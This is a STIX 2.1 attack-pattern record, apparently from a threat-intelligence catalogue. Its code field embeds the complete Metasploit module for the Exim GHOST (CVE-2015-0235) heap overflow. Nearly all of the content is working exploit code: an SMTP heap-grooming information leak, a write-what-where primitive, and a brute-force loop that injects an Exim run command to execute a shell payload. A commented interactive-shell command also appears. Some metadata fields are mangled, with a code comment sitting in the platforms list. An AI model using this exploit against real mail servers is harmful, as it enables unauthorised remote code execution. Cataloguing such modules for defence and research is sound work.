{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bec479cc-e3dc-41e5-b85e-c8e509e37965",
    "created": "2024-08-14T16:57:05.122251Z",
    "modified": "2024-08-14T16:57:05.122256Z",
    "name": "Exim GHOST (glibc gethostbyname) Buffer Overflow",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/smtp/exim_gethostbyname_bof.rb",
            "external_id": "exim_gethostbyname_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0235"
        },
        {
            "source_name": "reference",
            "url": "https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt"
        },
        {
            "source_name": "reference",
            "url": "https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/01/27/the-ghost-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "http://r-7.co/1CAnMc0#MSFWikidoc(thismodulesmanual)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Exim GHOST (glibc gethostbyname) Buffer Overflow',\n      'Description' => %q{\n        This module remotely exploits CVE-2015-0235, aka GHOST, a heap-based\n        buffer overflow in the GNU C Library's gethostbyname functions on x86\n        and x86_64 GNU/Linux systems that run the Exim mail server.\n      },\n      'Author' => [\n          'Unknown', # Discovered and published by Qualys, Inc.\n        ],\n      'License' => BSD_LICENSE,\n      'References' => [\n        ['CVE', '2015-0235'],\n        ['US-CERT-VU', '967332'],\n        ['OSVDB', '117579'],\n        ['BID', '72325'],\n        ['URL', 'https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt'],\n        ['URL', 'https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/01/27/the-ghost-vulnerability'],\n        ['URL', 'http://r-7.co/1CAnMc0'] # MSF Wiki doc (this module's manual)\n      ],\n      'DisclosureDate' => '2015-01-27',\n      'Privileged' => false, # uid=101(Debian-exim) gid=103(Debian-exim) groups=103(Debian-exim)\n      'Platform' => 'unix', # actually 'linux', but we execute a unix-command payload\n      'Arch' => ARCH_CMD, # actually [ARCH_X86, ARCH_X64], but ^\n      'Payload' => {\n        'Space' => 255, # the shorter the payload, the higher the probability of code execution\n        'BadChars' => \"\", # we encode the payload ourselves, because ^\n        'DisableNops' => true,\n        'ActiveTimeout' => 24*60*60 # we may need more than 150 s to execute our bind-shell\n      },\n      'Notes' => {'AKA' => ['ghost']},\n      'Targets' => [['Automatic', {}]],\n      'DefaultTarget' => 0\n    ))\n\n    register_options([\n      Opt::RPORT(25),\n      OptAddress.new('SENDER_HOST_ADDRESS', [true,\n        'The IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim)', nil])\n    ])\n\n    register_advanced_options([\n      OptBool.new('FORCE_EXPLOIT', [false, 'Let the exploit run anyway without the check first', nil])\n    ])\n  end\n\n  def check\n    # for now, no information about the vulnerable state of the target\n    check_code = Exploit::CheckCode::Unknown\n\n    begin\n      # not exploiting, just checking\n      smtp_connect(false)\n\n      # malloc()ate gethostbyname's buffer, and\n      # make sure its next_chunk isn't the top chunk\n\n      9.times do\n        smtp_send(\"HELO \", \"\", \"0\", \"\", \"\", 1024+16-1+0)\n        smtp_recv(HELO_CODES)\n      end\n\n      # overflow (4 bytes) gethostbyname's buffer, and\n      # overwrite its next_chunk's size field with 0x00303030\n\n      smtp_send(\"HELO \", \"\", \"0\", \"\", \"\", 1024+16-1+4)\n      # from now on, an exception means vulnerable\n      check_code = Exploit::CheckCode::Vulnerable\n      # raise an exception if no valid SMTP reply\n      reply = smtp_recv(ANY_CODE)\n      # can't determine vulnerable state if smtp_verify_helo() isn't called\n      return Exploit::CheckCode::Unknown if reply[:code] !~ /#{HELO_CODES}/\n\n      # realloc()ate gethostbyname's buffer, and\n      # crash (old glibc) or abort (new glibc)\n      # on the overwritten size field\n\n      smtp_send(\"HELO \", \"\", \"0\", \"\", \"\", 2048-16-1+4)\n      # raise an exception if no valid SMTP reply\n      reply = smtp_recv(ANY_CODE)\n      # can't determine vulnerable state if smtp_verify_helo() isn't called\n      return Exploit::CheckCode::Unknown if reply[:code] !~ /#{HELO_CODES}/\n      # a vulnerable target should've crashed by now\n      check_code = Exploit::CheckCode::Safe\n\n    rescue\n      peer = \"#{rhost}:#{rport}\"\n      vprint_status(\"Caught #{$!.class}: #{$!.message}\")\n\n    ensure\n      smtp_disconnect\n    end\n\n    return check_code\n  end\n\n  def exploit\n    unless datastore['FORCE_EXPLOIT']\n      print_status(\"Checking if target is vulnerable...\")\n      fail_with(Failure::NotVulnerable, \"Vulnerability check failed\") if check != Exploit::CheckCode::Vulnerable\n      print_good(\"Target is vulnerable.\")\n    end\n    information_leak\n    code_execution\n  end\n\n  private\n\n  HELO_CODES = '250|451|550'\n  ANY_CODE = '[0-9]{3}'\n\n  MIN_HEAP_SHIFT = 80\n  MIN_HEAP_SIZE = 128 * 1024\n  MAX_HEAP_SIZE = 1024 * 1024\n\n  # Exim\n  ALIGNMENT = 8\n  STORE_BLOCK_SIZE = 8192\n  STOREPOOL_MIN_SIZE = 256\n\n  LOG_BUFFER_SIZE = 8192\n  BIG_BUFFER_SIZE = 16384\n\n  SMTP_CMD_BUFFER_SIZE = 16384\n  IN_BUFFER_SIZE = 8192\n\n  # GNU C Library\n  PREV_INUSE = 0x1\n  NS_MAXDNAME = 1025\n\n  # Linux\n  MMAP_MIN_ADDR = 65536\n\n  def fail_with(fail_subject, message)\n    message = \"#{message}. For more info: http://r-7.co/1CAnMc0\"\n    super(fail_subject, message)\n  end\n\n  def information_leak\n    print_status(\"Trying information leak...\")\n    leaked_arch = nil\n    leaked_addr = []\n\n    # try different heap_shift values, in case Exim's heap address contains\n    # bad chars (NUL, CR, LF) and was mangled during the information leak;\n    # we'll keep the longest one (the least likely to have been truncated)\n\n    16.times do\n      done = catch(:another_heap_shift) do\n        heap_shift = MIN_HEAP_SHIFT + (rand(1024) & ~15)\n        vprint_status(\"#{{ heap_shift: heap_shift }}\")\n\n        # write the malloc_chunk header at increasing offsets (8-byte step),\n        # until we overwrite the \"503 sender not yet given\" error message\n\n        128.step(256, 8) do |write_offset|\n          error = try_information_leak(heap_shift, write_offset)\n          vprint_status(\"#{{ write_offset: write_offset, error: error }}\")\n          throw(:another_heap_shift) if not error\n          next if error == \"503 sender not yet given\"\n\n          # try a few more offsets (allows us to double-check things,\n          # and distinguish between 32-bit and 64-bit machines)\n\n          error = [error]\n          1.upto(5) do |i|\n            error[i] = try_information_leak(heap_shift, write_offset + i*8)\n            throw(:another_heap_shift) if not error[i]\n          end\n          vprint_status(\"#{{ error: error }}\")\n\n          _leaked_arch = leaked_arch\n          if (error[0] == error[1]) and (error[0].empty? or (error[0].unpack('C')[0] & 7) == 0) and # fd_nextsize\n             (error[2] == error[3]) and (error[2].empty? or (error[2].unpack('C')[0] & 7) == 0) and # fd\n             (error[4] =~ /\\A503 send[^e].?\\z/mn) and ((error[4].unpack('C*')[8] & 15) == PREV_INUSE) and # size\n             (error[5] == \"177\") # the last \\x7F of our BAD1 command, encoded as \\\\177 by string_printing()\n            leaked_arch = ARCH_X64\n\n          elsif (error[0].empty? or (error[0].unpack('C')[0] & 3) == 0) and # fd_nextsize\n                (error[1].empty? or (error[1].unpack('C')[0] & 3) == 0) and # fd\n                (error[2] =~ /\\A503 [^s].?\\z/mn) and ((error[2].unpack('C*')[4] & 7) == PREV_INUSE) and # size\n                (error[3] == \"177\") # the last \\x7F of our BAD1 command, encoded as \\\\177 by string_printing()\n            leaked_arch = ARCH_X86\n\n          else\n            throw(:another_heap_shift)\n          end\n          vprint_status(\"#{{ leaked_arch: leaked_arch }}\")\n          fail_with(Failure::BadConfig, \"arch changed\") if _leaked_arch and _leaked_arch != leaked_arch\n\n          # try different large-bins: most of them should be empty,\n          # so keep the most frequent fd_nextsize address\n          # (a pointer to the malloc_chunk itself)\n\n          count = Hash.new(0)\n          0.upto(9) do |last_digit|\n            error = try_information_leak(heap_shift, write_offset, last_digit)\n            next if not error or error.length < 2 # heap_shift can fix the 2 least significant NUL bytes\n            next if (error.unpack('C')[0] & (leaked_arch == ARCH_X86 ? 7 : 15)) != 0 # MALLOC_ALIGN_MASK\n            count[error] += 1\n          end\n          vprint_status(\"#{{ count: count }}\")\n          throw(:another_heap_shift) if count.empty?\n\n          # convert count to a nested array of [key, value] arrays and sort it\n          error_count = count.sort { |a, b| b[1] <=> a[1] }\n          error_count = error_count.first # most frequent\n          error = error_count[0]\n          count = error_count[1]\n          throw(:another_heap_shift) unless count >= 6 # majority\n          leaked_addr.push({ error: error, shift: heap_shift })\n\n          # common-case shortcut\n          if (leaked_arch == ARCH_X86 and error[0,4] == error[4,4] and error[8..-1] == \"er not yet given\") or\n             (leaked_arch == ARCH_X64 and error.length == 6 and error[5].count(\"\\x7E-\\x7F\").nonzero?)\n            leaked_addr = [leaked_addr.last] # use this one, and not another\n            throw(:another_heap_shift, true) # done\n          end\n          throw(:another_heap_shift)\n        end\n        throw(:another_heap_shift)\n      end\n      break if done\n    end\n\n    fail_with(Failure::NotVulnerable, \"not vuln? old glibc? (no leaked_arch)\") if leaked_arch.nil?\n    fail_with(Failure::NotVulnerable, \"NUL, CR, LF in addr? (no leaked_addr)\") if leaked_addr.empty?\n\n    leaked_addr.sort! { |a, b| b[:error].length <=> a[:error].length }\n    leaked_addr = leaked_addr.first # longest\n    error = leaked_addr[:error]\n    shift = leaked_addr[:shift]\n\n    leaked_addr = 0\n    (leaked_arch == ARCH_X86 ? 4 : 8).times do |i|\n      break if i >= error.length\n      leaked_addr += error.unpack('C*')[i] * (2**(i*8))\n    end\n    # leaked_addr should point to the beginning of Exim's smtp_cmd_buffer:\n    leaked_addr -= 2*SMTP_CMD_BUFFER_SIZE + IN_BUFFER_SIZE + 4*(11*1024+shift) + 3*1024 + STORE_BLOCK_SIZE\n    fail_with(Failure::NoTarget, \"NUL, CR, LF in addr? (no leaked_addr)\") if leaked_addr <= MMAP_MIN_ADDR\n\n    print_good(\"Successfully leaked_arch: #{leaked_arch}\")\n    print_good(\"Successfully leaked_addr: #{leaked_addr.to_s(16)}\")\n    @leaked = { arch: leaked_arch, addr: leaked_addr }\n  end\n\n  def try_information_leak(heap_shift, write_offset, last_digit = 9)\n    fail_with(Failure::BadConfig, \"heap_shift\") if (heap_shift < MIN_HEAP_SHIFT)\n    fail_with(Failure::BadConfig, \"heap_shift\") if (heap_shift & 15) != 0\n    fail_with(Failure::BadConfig, \"write_offset\") if (write_offset & 7) != 0\n    fail_with(Failure::BadConfig, \"last_digit\") if \"#{last_digit}\" !~ /\\A[0-9]\\z/\n\n    smtp_connect\n\n    # bulletproof Heap Feng Shui; the hard part is avoiding:\n    # \"Too many syntax or protocol errors\" (3)\n    # \"Too many unrecognized commands\" (3)\n    # \"Too many nonmail commands\" (10)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 11*1024+13-1 + heap_shift)\n    smtp_recv(250)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 3*1024+13-1)\n    smtp_recv(250)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 3*1024+16+13-1)\n    smtp_recv(250)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 8*1024+16+13-1)\n    smtp_recv(250)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 5*1024+16+13-1)\n    smtp_recv(250)\n\n    # overflow (3 bytes) gethostbyname's buffer, and\n    # overwrite its next_chunk's size field with 0x003?31\n                                                    # ^ last_digit\n    smtp_send(\"HELO \", \"\", \"0\", \".1#{last_digit}\", \"\", 12*1024+3-1 + heap_shift-MIN_HEAP_SHIFT)\n    begin                       # ^ 0x30 | PREV_INUSE\n      smtp_recv(HELO_CODES)\n\n      smtp_send(\"RSET\")\n      smtp_recv(250)\n\n      smtp_send(\"RCPT TO:\", \"\", method(:rand_text_alpha), \"\\x7F\", \"\", 15*1024)\n      smtp_recv(503, 'sender not yet given')\n\n      smtp_send(\"\", \"BAD1 \", method(:rand_text_alpha), \"\\x7F\\x7F\\x7F\\x7F\", \"\", 10*1024-16-1 + write_offset)\n      smtp_recv(500, '\\A500 unrecognized command\\r\\n\\z')\n\n      smtp_send(\"BAD2 \", \"\", method(:rand_text_alpha), \"\\x7F\", \"\", 15*1024)\n      smtp_recv(500, '\\A500 unrecognized command\\r\\n\\z')\n\n      smtp_send(\"DATA\")\n      reply = smtp_recv(503)\n\n      lines = reply[:lines]\n      fail if lines.size <= 3\n      fail if lines[+0] != \"503-All RCPT commands were rejected with this error:\\r\\n\"\n      fail if lines[-2] != \"503-valid RCPT command must precede DATA\\r\\n\"\n      fail if lines[-1] != \"503 Too many syntax or protocol errors\\r\\n\"\n\n      # if leaked_addr contains LF, reverse smtp_respond()'s multiline splitting\n      # (the \"while (isspace(*msg)) msg++;\" loop can't be easily reversed,\n      # but happens with lower probability)\n\n      error = lines[+1..-3].join(\"\")\n      error.sub!(/\\A503-/mn, \"\")\n      error.sub!(/\\r\\n\\z/mn, \"\")\n      error.gsub!(/\\r\\n503-/mn, \"\\n\")\n      return error\n\n    rescue\n      return nil\n    end\n\n  ensure\n    smtp_disconnect\n  end\n\n  def code_execution\n    print_status(\"Trying code execution...\")\n\n    # can't \"${run{/bin/sh -c 'exec /bin/sh -i <&#{b} >&0 2>&0'}} \" anymore:\n    # DW/26 Set FD_CLOEXEC on SMTP sockets after forking in the daemon, to ensure\n    #       that rogue child processes cannot use them.\n\n    fail_with(Failure::BadConfig, \"encoded payload\") if payload.raw != payload.encoded\n    fail_with(Failure::BadConfig, \"invalid payload\") if payload.raw.empty? or payload.raw.count(\"^\\x20-\\x7E\").nonzero?\n    # Exim processes our run-ACL with expand_string() first (hence the [\\$\\{\\}\\\\] escapes),\n    # and transport_set_up_command(), string_dequote() next (hence the [\\\"\\\\] escapes).\n    encoded = payload.raw.gsub(/[\\\"\\\\]/, '\\\\\\\\\\\\&').gsub(/[\\$\\{\\}\\\\]/, '\\\\\\\\\\\\&')\n    # setsid because of Exim's \"killpg(pid, SIGKILL);\" after \"alarm(60);\"\n    command = '${run{/usr/bin/env setsid /bin/sh -c \"' + encoded + '\"}}'\n    vprint_status(\"Command: #{command}\")\n\n    # don't try to execute commands directly, try a very simple ACL first,\n    # to distinguish between exploitation-problems and shellcode-problems\n\n    acldrop = \"drop message=\"\n    message = rand_text_alpha(command.length - acldrop.length)\n    acldrop += message\n\n    max_rand_offset = (@leaked[:arch] == ARCH_X86 ? 32 : 64)\n    max_heap_addr = @leaked[:addr]\n    min_heap_addr = nil\n    survived = nil\n\n    # we later fill log_buffer and big_buffer with alpha chars,\n    # which creates a safe-zone at the beginning of the heap,\n    # where we can't possibly crash during our brute-force\n\n    # 4, because 3 copies of sender_helo_name, and step_len;\n    # start big, but refine little by little in case\n    # we crash because we overwrite important data\n\n    helo_len = (LOG_BUFFER_SIZE + BIG_BUFFER_SIZE) / 4\n    loop do\n\n      sender_helo_name = \"A\" * helo_len\n      address = sprintf(\"[%s]:%d\", @sender[:hostaddr], 65535)\n\n      # the 3 copies of sender_helo_name, allocated by\n      # host_build_sender_fullhost() in POOL_PERM memory\n\n      helo_ip_size = ALIGNMENT +\n        sender_helo_name[+1..-2].length\n\n      sender_fullhost_size = ALIGNMENT +\n        sprintf(\"%s (%s) %s\", @sender[:hostname], sender_helo_name, address).length\n\n      sender_rcvhost_size = ALIGNMENT + ((@sender[:ident] == nil) ?\n        sprintf(\"%s (%s helo=%s)\", @sender[:hostname], address, sender_helo_name) :\n        sprintf(\"%s\\n\\t(%s helo=%s ident=%s)\", @sender[:hostname], address, sender_helo_name, @sender[:ident])\n      ).length\n\n      # fit completely into the safe-zone\n      step_len = (LOG_BUFFER_SIZE + BIG_BUFFER_SIZE) -\n        (max_rand_offset + helo_ip_size + sender_fullhost_size + sender_rcvhost_size)\n      loop do\n\n        # inside smtp_cmd_buffer (we later fill smtp_cmd_buffer and smtp_data_buffer\n        # with alpha chars, which creates another safe-zone at the end of the heap)\n        heap_addr = max_heap_addr\n        loop do\n\n          # try harder the first time around: we obtain better\n          # heap boundaries, and we usually hit our ACL faster\n\n          (min_heap_addr ? 1 : 2).times do\n\n            # try the same heap_addr several times, but with different random offsets,\n            # in case we crash because our hijacked storeblock's length field is too small\n            # (we don't control what's stored at heap_addr)\n\n            rand_offset = rand(max_rand_offset)\n            vprint_status(\"#{{ helo: helo_len, step: step_len, addr: heap_addr.to_s(16), offset: rand_offset }}\")\n            reply = try_code_execution(helo_len, acldrop, heap_addr + rand_offset)\n            vprint_status(\"#{{ reply: reply }}\") if reply\n\n            if reply and\n               reply[:code] == \"550\" and\n               # detect the parsed ACL, not the \"still in text form\" ACL (with \"=\")\n               reply[:lines].join(\"\").delete(\"^=A-Za-z\") =~ /(\\A|[^=])#{message}/mn\n              print_good(\"Brute-force SUCCESS\")\n              print_good(\"Please wait for reply...\")\n              # execute command this time, not acldrop\n              reply = try_code_execution(helo_len, command, heap_addr + rand_offset)\n              vprint_status(\"#{{ reply: reply }}\")\n              return handler\n            end\n\n            if not min_heap_addr\n              if reply\n                fail_with(Failure::BadConfig, \"no min_heap_addr\") if (max_heap_addr - heap_addr) >= MAX_HEAP_SIZE\n                survived = heap_addr\n              else\n                if ((survived ? survived : max_heap_addr) - heap_addr) >= MIN_HEAP_SIZE\n                  # survived should point to our safe-zone at the beginning of the heap\n                  fail_with(Failure::UnexpectedReply, \"never survived\") if not survived\n                  print_good \"Brute-forced min_heap_addr: #{survived.to_s(16)}\"\n                  min_heap_addr = survived\n                end\n              end\n            end\n          end\n\n          heap_addr -= step_len\n          break if min_heap_addr and heap_addr < min_heap_addr\n        end\n\n        break if step_len < 1024\n        step_len /= 2\n      end\n\n      helo_len /= 2\n      break if helo_len < 1024\n      # ^ otherwise the 3 copies of sender_helo_name will\n      # fit into the current_block of POOL_PERM memory\n    end\n    fail_with(Failure::UnexpectedReply, \"Brute-force FAILURE\")\n  end\n\n  # our write-what-where primitive\n  def try_code_execution(len, what, where)\n    fail_with(Failure::UnexpectedReply, \"#{what.length} >= #{len}\") if what.length >= len\n    fail_with(Failure::UnexpectedReply, \"#{where} < 0\") if where < 0\n\n    x86 = (@leaked[:arch] == ARCH_X86)\n    min_heap_shift = (x86 ? 512 : 768) # at least request2size(sizeof(FILE))\n    heap_shift = min_heap_shift + rand(1024 - min_heap_shift)\n    last_digit = 1 + rand(9)\n\n    smtp_connect\n\n    # fill smtp_cmd_buffer, smtp_data_buffer, and big_buffer with alpha chars\n    smtp_send(\"MAIL FROM:\", \"\", method(:rand_text_alpha), \"<#{rand_text_alpha_upper(8)}>\", \"\", BIG_BUFFER_SIZE -\n             \"501 : sender address must contain a domain\\r\\n\\0\".length)\n    smtp_recv(501, 'sender address must contain a domain')\n\n    smtp_send(\"RSET\")\n    smtp_recv(250)\n\n    # bulletproof Heap Feng Shui; the hard part is avoiding:\n    # \"Too many syntax or protocol errors\" (3)\n    # \"Too many unrecognized commands\" (3)\n    # \"Too many nonmail commands\" (10)\n\n    # / 5, because \"\\x7F\" is non-print, and:\n    # ss = store_get(length + nonprintcount * 4 + 1);\n    smtp_send(\"BAD1 \", \"\", \"\\x7F\", \"\", \"\", (19*1024 + heap_shift) / 5)\n    smtp_recv(500, '\\A500 unrecognized command\\r\\n\\z')\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 5*1024+13-1)\n    smtp_recv(250)\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 3*1024+13-1)\n    smtp_recv(250)\n\n    smtp_send(\"BAD2 \", \"\", \"\\x7F\", \"\", \"\", (13*1024 + 128) / 5)\n    smtp_recv(500, '\\A500 unrecognized command\\r\\n\\z')\n\n    smtp_send(\"HELO \", \"\", \"0\", @sender[:hostaddr8], \"\", 3*1024+16+13-1)\n    smtp_recv(250)\n\n    # overflow (3 bytes) gethostbyname's buffer, and\n    # overwrite its next_chunk's size field with 0x003?31\n                                                    # ^ last_digit\n    smtp_send(\"EHLO \", \"\", \"0\", \".1#{last_digit}\", \"\", 5*1024+64+3-1)\n    smtp_recv(HELO_CODES)       # ^ 0x30 | PREV_INUSE\n\n    # auth_xtextdecode() is the only way to overwrite the beginning of a\n    # current_block of memory (the \"storeblock\" structure) with arbitrary data\n    # (so that our hijacked \"next\" pointer can contain NUL, CR, LF characters).\n    # this shapes the rest of our exploit: we overwrite the beginning of the\n    # current_block of POOL_PERM memory with the current_block of POOL_MAIN\n    # memory (allocated by auth_xtextdecode()).\n\n    auth_prefix = rand_text_alpha(x86 ? 11264 : 11280)\n    (x86 ? 4 : 8).times { |i| auth_prefix += sprintf(\"+%02x\", (where >> (i*8)) & 255) }\n    auth_prefix += \".\"\n\n    # also fill log_buffer with alpha chars\n    smtp_send(\"MAIL FROM:<> AUTH=\", auth_prefix, method(:rand_text_alpha), \"+\", \"\", 0x3030)\n    smtp_recv(501, 'invalid data for AUTH')\n\n    smtp_send(\"HELO \", \"[1:2:3:4:5:6:7:8%eth0:\", \" \", \"#{what}]\", \"\", len)\n    begin\n      reply = smtp_recv(ANY_CODE)\n      return reply if reply[:code] !~ /#{HELO_CODES}/\n      return reply if reply[:code] != \"250\" and reply[:lines].first !~ /argument does not match calling host/\n\n      smtp_send(\"MAIL FROM:<>\")\n      reply = smtp_recv(ANY_CODE)\n      return reply if reply[:code] != \"250\"\n\n      smtp_send(\"RCPT TO:<postmaster>\")\n      reply = smtp_recv\n      return reply\n\n    rescue\n      return nil\n    end\n\n  ensure\n    smtp_disconnect\n  end\n\n  DIGITS = '([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])'\n  DOT = '[.]'\n\n  def smtp_connect(exploiting = true)\n    fail_with(Failure::Unknown, \"sock isn't nil\") if sock\n\n    connect\n    fail_with(Failure::Unknown, \"sock is nil\") if not sock\n    @smtp_state = :recv\n\n    # Receiving the banner (but we don't really need to check it)\n    smtp_recv(220)\n    return if not exploiting\n\n    sender_host_address = datastore['SENDER_HOST_ADDRESS']\n    if sender_host_address !~ /\\A#{DIGITS}#{DOT}#{DIGITS}#{DOT}#{DIGITS}#{DOT}#{DIGITS}\\z/\n      fail_with(Failure::BadConfig, \"bad SENDER_HOST_ADDRESS (nil)\") if sender_host_address.nil?\n      fail_with(Failure::BadConfig, \"bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation)\")\n    end\n    sender_host_address_octal = \"0\" + $1.to_i.to_s(8) + \".#{$2}.#{$3}.#{$4}\"\n\n    # turn helo_seen on (enable the MAIL command)\n    # call smtp_verify_helo() (force fopen() and small malloc()s)\n    # call host_find_byname() (force gethostbyname's initial 1024-byte malloc())\n    smtp_send(\"HELO #{sender_host_address_octal}\")\n    reply = smtp_recv(HELO_CODES)\n\n    if reply[:code] != \"250\"\n      fail_with(Failure::NoTarget, \"not Exim?\") if reply[:lines].first !~ /argument does not match calling host/\n      fail_with(Failure::BadConfig, \"bad SENDER_HOST_ADDRESS (helo_verify_hosts)\")\n    end\n\n    if reply[:lines].first =~ /\\A250 (\\S*) Hello (.*) \\[(\\S*)\\]\\r\\n\\z/mn\n      fail_with(Failure::BadConfig, \"bad SENDER_HOST_ADDRESS (helo_try_verify_hosts)\") if sender_host_address != $3\n      smtp_active_hostname = $1\n      sender_host_name = $2\n\n      if sender_host_name =~ /\\A(.*) at (\\S*)\\z/mn\n        sender_host_name = $2\n        sender_ident = $1\n      else\n        sender_ident = nil\n      end\n      fail_with(Failure::BadConfig, \"bad SENDER_HOST_ADDRESS (no FCrDNS)\") if sender_host_name == sender_host_address_octal\n\n    else\n      # can't double-check sender_host_address here, so only for advanced users\n      fail_with(Failure::BadConfig, \"user-supplied EHLO greeting\") unless datastore['FORCE_EXPLOIT']\n      # worst-case scenario\n      smtp_active_hostname = \"A\" * NS_MAXDNAME\n      sender_host_name = \"A\" * NS_MAXDNAME\n      sender_ident = \"A\" * 127 * 4 # sender_ident = string_printing(string_copyn(p, 127));\n    end\n\n    _sender = @sender\n    @sender = {\n      hostaddr: sender_host_address,\n      hostaddr8: sender_host_address_octal,\n      hostname: sender_host_name,\n      ident: sender_ident,\n      __smtp_active_hostname: smtp_active_hostname\n    }\n    fail_with(Failure::BadConfig, \"sender changed\") if _sender and _sender != @sender\n\n    # avoid a future pathological case by forcing it now:\n    # \"Do NOT free the first successor, if our current block has less than 256 bytes left.\"\n    smtp_send(\"MAIL FROM:\", \"<\", method(:rand_text_alpha), \">\", \"\", STOREPOOL_MIN_SIZE + 16)\n    smtp_recv(501, 'sender address must contain a domain')\n\n    smtp_send(\"RSET\")\n    smtp_recv(250, 'Reset OK')\n  end\n\n  def smtp_send(prefix, arg_prefix = nil, arg_pattern = nil, arg_suffix = nil, suffix = nil, arg_length = nil)\n    fail_with(Failure::BadConfig, \"state is #{@smtp_state}\") if @smtp_state != :send\n    @smtp_state = :sending\n\n    if not arg_pattern\n      fail_with(Failure::BadConfig, \"prefix is nil\") if not prefix\n      fail_with(Failure::BadConfig, \"param isn't nil\") if arg_prefix or arg_suffix or suffix or arg_length\n      command = prefix\n\n    else\n      fail_with(Failure::BadConfig, \"param is nil\") unless prefix and arg_prefix and arg_suffix and suffix and arg_length\n      length = arg_length - arg_prefix.length - arg_suffix.length\n      fail_with(Failure::BadConfig, \"smtp_send\", \"len is #{length}\") if length <= 0\n      argument = arg_prefix\n      case arg_pattern\n      when String\n        argument += arg_pattern * (length / arg_pattern.length)\n        argument += arg_pattern[0, length % arg_pattern.length]\n      when Method\n        argument += arg_pattern.call(length)\n      end\n      argument += arg_suffix\n      fail_with(Failure::BadConfig, \"arglen is #{argument.length}, not #{arg_length}\") if argument.length != arg_length\n      command = prefix + argument + suffix\n    end\n\n    fail_with(Failure::BadConfig, \"invalid char in cmd\") if command.count(\"^\\x20-\\x7F\") > 0\n    fail_with(Failure::BadConfig, \"cmdlen is #{command.length}\") if command.length > SMTP_CMD_BUFFER_SIZE\n    command += \"\\n\" # RFC says CRLF, but squeeze as many chars as possible in smtp_cmd_buffer\n\n    # the following loop works around a bug in the put() method:\n    # \"while (send_idx < send_len)\" should be \"while (send_idx < buf.length)\"\n    # (or send_idx and/or send_len could be removed altogether, like here)\n\n    while command and not command.empty?\n      num_sent = sock.put(command)\n      fail_with(Failure::BadConfig, \"sent is #{num_sent}\") if num_sent <= 0\n      fail_with(Failure::BadConfig, \"sent is #{num_sent}, greater than #{command.length}\") if num_sent > command.length\n      command = command[num_sent..-1]\n    end\n\n    @smtp_state = :recv\n  end\n\n  def smtp_recv(expected_code = nil, expected_data = nil)\n    fail_with(Failure::BadConfig, \"state is #{@smtp_state}\") if @smtp_state != :recv\n    @smtp_state = :recving\n\n    failure = catch(:failure) do\n\n      # parse SMTP replies very carefully (the information\n      # leak injects arbitrary data into multiline replies)\n\n      data = \"\"\n      while data !~ /(\\A|\\r\\n)[0-9]{3}[ ].*\\r\\n\\z/mn\n        begin\n          more_data = sock.get_once\n        rescue\n          throw(:failure, \"Caught #{$!.class}: #{$!.message}\")\n        end\n        throw(:failure, \"no more data\") if more_data.nil?\n        throw(:failure, \"no more data\") if more_data.empty?\n        data += more_data\n      end\n\n      throw(:failure, \"malformed reply (count)\") if data.count(\"\\0\") > 0\n      lines = data.scan(/(?:\\A|\\r\\n)[0-9]{3}[ -].*?(?=\\r\\n(?=[0-9]{3}[ -]|\\z))/mn)\n      throw(:failure, \"malformed reply (empty)\") if lines.empty?\n\n      code = nil\n      lines.size.times do |i|\n        lines[i].sub!(/\\A\\r\\n/mn, \"\")\n        lines[i] += \"\\r\\n\"\n\n        if i == 0\n          code = lines[i][0,3]\n          throw(:failure, \"bad code\") if code !~ /\\A[0-9]{3}\\z/mn\n          if expected_code and code !~ /\\A(#{expected_code})\\z/mn\n            throw(:failure, \"unexpected #{code}, expected #{expected_code}\")\n          end\n        end\n\n        line_begins_with = lines[i][0,4]\n        line_should_begin_with = code + (i == lines.size-1 ? \" \" : \"-\")\n\n        if line_begins_with != line_should_begin_with\n          throw(:failure, \"line begins with #{line_begins_with}, \" \\\n                          \"should begin with #{line_should_begin_with}\")\n        end\n      end\n\n      throw(:failure, \"malformed reply (join)\") if lines.join(\"\") != data\n      if expected_data and data !~ /#{expected_data}/mn\n        throw(:failure, \"unexpected data\")\n      end\n\n      reply = { code: code, lines: lines }\n      @smtp_state = :send\n      return reply\n    end\n\n    fail_with(Failure::UnexpectedReply, \"#{failure}\") if expected_code\n    return nil\n  end\n\n  def smtp_disconnect\n    disconnect if sock\n    fail_with(Failure::Unknown, \"sock isn't nil\") if sock\n    @smtp_state = :disconnected\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-01-27",
    "x_mitre_platforms": [
        "unix', # actually 'linux', but we execute a unix-command payload"
    ]
}